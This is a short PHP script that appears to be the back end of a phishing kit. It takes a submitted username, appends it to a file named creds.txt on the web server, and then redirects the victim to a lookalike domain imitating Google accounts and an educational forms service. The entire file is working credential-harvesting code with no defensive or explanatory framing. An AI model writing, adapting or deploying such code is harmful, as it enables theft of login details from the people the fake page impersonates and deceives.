<?php
if (isset($_POST["usuario"])) {
    $user = $_POST["usuario"];
    ($file = fopen("/var/www/html/creds.txt", "a+")) or die("Unable to openfile!");
    $data = "Usuari: " . $user . "\n";
    fwrite($file, $data);
    fclose($file);
    header("Location: https://accounts-google-ibadia-educaciodigital-docs-formulari-google.com/formularios.html");
}
?>